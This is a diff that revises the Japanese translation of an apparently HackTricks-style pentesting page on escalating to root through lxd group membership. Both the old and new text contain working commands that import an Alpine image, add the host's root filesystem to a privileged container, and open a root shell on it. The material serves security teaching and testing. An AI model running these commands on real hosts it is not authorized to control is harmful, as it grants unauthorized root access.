@@ -1,16 +1,18 @@
 # lxd/lxc Group - Privilege escalation
 
-ホストのLXD管理グループ（通常は _**lxd**_）に所属していると、daemonを完全に制御できるため、rootへの昇格経路となる可能性があります。<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## internetなしでのExploit
+ホストの LXD 管理グループ（通常は _**lxd**_）に所属していると、daemon を完全に制御できるため、root への昇格経路になる可能性があります。<sup>[[1]](#references)</sup>
+
+## インターネットを使用しない Exploiting
 
 ### Method 1
 
-信頼できるrepositoryから、LXDで使用するAlpine imageをdownloadできます。
-CanonicalのLXD image serverではdaily buildが公開されています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-最新のbuild（directory名は日付）から、**lxd.tar.xz**と**rootfs.squashfs**の両方を取得するだけです。<sup>[[8]](#references)</sup>
+信頼できる repository から、LXD で使用する Alpine image を download できます。  
+Canonical の LXD image server は daily build を公開しています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください（directory 名は日付です）。<sup>[[8]](#references)</sup>
 
-また、[project instructions](https://github.com/lxc/distrobuilder)に従って、マシンにdistrobuilderをinstallすることもできます。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
+または、[project instructions](https://github.com/lxc/distrobuilder) に従って、使用している machine に distrobuilder を install できます。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -33,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz**（Canonical image serverからダウンロードした場合は**lxd.tar.xz**）と**rootfs.squashfs**をアップロードし、その後イメージをimportしてcontainerを作成します。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
+**incus.tar.xz**（Canonical image serverからダウンロードした場合は**lxd.tar.xz**）と**rootfs.squashfs**をアップロードし、イメージをインポートしてコンテナを作成します。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -50,17 +52,17 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > このエラー _**Error: No storage pool found. Please create a new storage pool**_ が表示された場合\
-> **`lxd init`** を実行してデフォルトの storage pool を設定し、その後、直前のコマンドのまとまりを**再実行**します。<sup>[[2]](#references)</sup>
+> **`lxd init`** を実行してデフォルトの storage pool を設定し、その後、直前のコマンド群を再度実行してください。<sup>[[2]](#references)</sup>
 
-最後に、container を起動し、host のファイルシステム上で root shell を開きます。<sup>[[1]](#references)[[2]](#references)</sup>
+最後に、container を起動し、host filesystem 上で root shell を開きます。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Method 2
+### 方法 2
 
-Alpine image を構築し、`security.privileged=true` フラグを付けて起動すると、container の root が host の root にマッピングされます。さらに `/` を mount することで、container 内から host の filesystem にアクセスできるようになります。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Alpine image を構築し、`security.privileged=true` フラグを指定して起動すると、container root が host root にマッピングされます。これにより、`/` をマウントすると host filesystem が container 内に公開されます。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
